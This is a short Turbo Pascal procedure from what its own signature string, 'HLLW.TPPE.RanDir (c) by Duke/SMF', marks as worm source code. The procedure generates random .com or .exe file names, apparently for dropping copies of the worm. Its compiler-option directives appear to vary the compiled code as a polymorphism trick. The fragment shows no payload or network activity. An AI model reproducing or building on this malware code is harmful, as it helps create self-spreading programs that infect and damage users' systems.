   procedure MakeRandomName;
   var i,d:byte;
   begin
   {$IFOPT F+}d:=random(8)+1;{$ENDIF}
   {$IFOPT I+}NewName:='[HLLW.TPPE.RanDir (c) by Duke/SMF]';{$ENDIF}
   NewName:='';
   {$IFOPT F-}d:=random(8)+1;{$ENDIF}
   for i:=1 to d do NewName:=NewName+chr(random(26)+97);
   d:=random(255);
   if {$IFOPT V+}d div 2 = d/2{$ELSE}d mod 2 = 1{$ENDIF}
     then NewName:=NewName+'.com' else NewName:=NewName+'.exe';
   end;
